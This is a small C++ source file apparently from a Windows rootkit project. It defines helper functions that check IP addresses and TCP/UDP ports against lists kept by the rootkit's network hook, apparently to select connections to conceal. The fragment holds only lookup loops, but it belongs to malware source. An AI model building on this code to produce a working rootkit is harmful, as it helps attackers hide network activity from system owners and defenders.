#include "rootkit.hpp"

BOOLEAN Utils::FindIP(ULONG IP)
{
	for (UINT32 i = 0; i < UMAX; i++)
		if (Rootkit::NetHook::Net.IP[i] == IP)
			return TRUE;
	return FALSE;
}

BOOLEAN Utils::FindLTCP(USHORT LTCP)
{
	for (UINT32 i = 0; i < UMAX; i++)
		if (Rootkit::NetHook::Net.LTCP[i] == LTCP)
			return TRUE;
	return FALSE;
}

BOOLEAN Utils::FindRTCP(USHORT RTCP)
{
	for (UINT32 i = 0; i < UMAX; i++)
		if (Rootkit::NetHook::Net.RTCP[i] != 0 && Rootkit::NetHook::Net.RTCP[i] == RTCP)
			return TRUE;
	return FALSE;
}

BOOLEAN Utils::FindUDP(USHORT UDP)
{
	for (UINT32 i = 0; i < UMAX; i++)
		if (Rootkit::NetHook::Net.UDP[i] != 0 && Rootkit::NetHook::Net.UDP[i] == UDP)
			return TRUE;
	return FALSE;
}